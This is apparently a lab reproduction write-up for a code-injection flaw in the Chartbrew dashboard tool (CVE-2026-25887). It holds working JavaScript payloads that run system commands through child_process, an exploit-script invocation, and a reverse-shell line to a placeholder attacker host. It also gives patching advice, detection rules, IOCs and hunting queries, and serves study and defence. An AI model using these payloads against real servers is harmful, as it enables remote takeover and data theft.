# CVE-2026-25887 — Chartbrew MongoDB Dataset Query RCE

> Lab Reproduction | vulhub/chartbrew:4.8.0 | 2026-05-24

**Outcome**: Authenticated RCE via `Function()` injection → `child_process.execSync()`.

---

## 1. CVE Background & Impact

| Field | Value |
|-------|-------|
| CVE | CVE-2026-25887 |
| Affected | Chartbrew ≤ 4.8.0 |
| CVSS | 8.8 (High) |
| Prerequisites | Valid account (self-registration available; first user = admin) |
| Type | CWE-94: Code Injection via `new Function()` |
| Patched | 4.8.1 — AST-based query validation |

**Root cause**: `runMongo()` in `ConnectionController.js` passes user-supplied MongoDB queries into `new Function('MongoClient', 'collection', query)` without validation. JavaScript's `Function()` constructor is functionally equivalent to `eval`. Attackers escape the MongoDB call chain via `global.process.mainModule.require('child_process')` to execute arbitrary system commands.

## 2. Reproduction Steps

### 2.1 Start target

```bash
cd vulhub/chartbrew/CVE-2026-25887
CB_HOST=<your-ip> docker compose up -d
# Web UI: http://127.0.0.1:4018  |  API: http://127.0.0.1:4019
```

### 2.2 Attack flow

1. **Register** — first registered user automatically becomes admin
2. **Create project** via Setup Wizard or API
3. **Connect MongoDB** — point to the included `mongodb://mongodb:27017/vulhub`
4. **Create dataset** with malicious query:

```javascript
version + (function(){
  try {
    const r = global.process.mainModule.require('child_process');
    return r.execSync('id').toString();
  } catch(e) { return e.toString(); }
})()
```

5. **Run query** — result panel displays `id` output.

### 2.3 How it works

```
User input (MongoDB query)
  → runMongo(query)
  → new Function('MongoClient', 'collection', query)
  → JavaScript in query executes directly
  → global.process.mainModule.require('child_process')
  → execSync('arbitrary command')
```

### 2.4 API automation

```bash
python3 exploit.py --rhost 127.0.0.1 --register --cmd "id"
# [+] Login successful → Project created → Connection added
# [+] Dataset triggered → uid=0(root) gid=0(root)
```

### 2.5 Reverse shell variant

```javascript
version + (function(){
  const r = global.process.mainModule.require('child_process');
  r.execSync('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"');
  return 'ok';
})()
```

## 3. Defense

### 3.1 Hardening / Patches / Mitigations

| # | Measure | Priority |
|---|---------|----------|
| 1 | Upgrade Chartbrew to 4.8.1+ (AST validation) | **Critical** |
| 2 | Server-side input validation: reject queries containing `require(`, `global`, `process`, `Function`, `constructor`, `child_process` | High |
| 3 | Use `vm2` or `isolated-vm` sandbox instead of bare `new Function()` | High |
| 4 | Run Chartbrew as non-root user in containers | Medium |
| 5 | WAF: block `require('child_process')` and `execSync` in POST bodies to dataset endpoints | Medium |
| 6 | Enable Chartbrew audit logging for all dataset query execution | Low |
| 7 | Container runtime security: seccomp/AppArmor restricting `execve` | Medium |

### 3.2 Detection (Narrative)

- **WAF/API Gateway**: Detect `require('child_process')`, `execSync`, `global.process` in dataset POST bodies
- **Falco**: Monitor Node.js process for `/bin/bash -c` or `/bin/sh -c` child processes
- **Chartbrew logs**: Audit dataset creation and query execution; flag abnormally long query strings
- **Network**: Node.js service initiating outbound TCP (reverse shell signature)

### 3.3 Threat Hunting (Narrative)

- **Processes**: Look for `sh`/`bash` children of `node` — Chartbrew has no legitimate shell spawns
- **Filesystem**: Check `/tmp/`, `/app/` for unexpected files or webshells
- **Network**: Audit outbound connections from Chartbrew container — should only connect to mysql/redis/mongodb
- **Dataset audit**: Review all MongoDB dataset queries for `require(`, `execSync`, `child_process`

### 3.4 SOC Artifacts

#### Sigma Rule

```yaml
title: CVE-2026-25887 Chartbrew Function() Injection RCE
id: 6d1a2f8e-9c4d-4b3f-85a1-c7f2d4e9b03a
status: experimental
logsource:
  category: application
  service: chartbrew
detection:
  selection:
    cs-uri-query|contains: '/api/v1/projects/'
    cs-body|contains|all: ['require(','child_process','execSync']
  condition: selection
tags: [attack.t1059.007, attack.execution, cve.2026.25887]
level: critical
```

#### Suricata Rule

```
alert http $HOME_NET any -> $HOME_NET any (
    msg: "CVE-2026-25887 Chartbrew MongoDB Dataset Query RCE";
    flow: to_server, established;
    http.method; content: "POST"; nocase;
    http.uri; content: "/api/v1/projects/"; nocase;
    http.uri; content: "dataset"; nocase;
    http.request_body; content: "require('child_process')"; nocase;
    http.request_body; content: "execSync"; nocase;
    reference: cve,2026.25887;
    classtype: attempted-admin;
    sid: 2026025887; rev: 1;
)
```

#### IOC Table

| Type | Indicator | Confidence | Notes |
|------|-----------|------------|-------|
| HTTP Body | `require('child_process')` | High | Code injection payload |
| HTTP Body | `execSync` | High | Command execution method |
| HTTP Body | `global.process.mainModule` | High | Sandbox escape technique |
| HTTP Body | `new Function(` + `MongoClient` | Medium | Vulnerable code path |
| File | `/tmp/*` (attacker artifacts) | Low | Post-exploitation |

#### SIEM Hunting Queries

**Splunk SPL**:
```spl
index=web sourcetype=chartbrew_api
| search "/api/v1/projects/*/dataset*" method=POST
| search request_body="*require(*child_process*" OR request_body="*execSync*"
| table _time client_ip uri request_body
```

**Microsoft Sentinel KQL**:
```kql
CommonSecurityLog
| where RequestURL contains "/api/v1/projects/"
    and RequestURL contains "dataset"
    and RequestMethod == "POST"
    and (RequestBody contains "require('child_process')"
         or RequestBody contains "execSync")
| project TimeGenerated, SourceIP, RequestURL, RequestBody
```

## 4. References

- [GitHub Security Advisory GHSA-x4r6-prmw-7wvw](https://github.com/chartbrew/chartbrew/security/advisories/GHSA-x4r6-prmw-7wvw)
- [NVD — CVE-2026-25887](https://nvd.nist.gov/vuln/detail/CVE-2026-25887)
- [vulhub/chartbrew/CVE-2026-25887](https://github.com/vulhub/vulhub/tree/master/chartbrew/CVE-2026-25887)
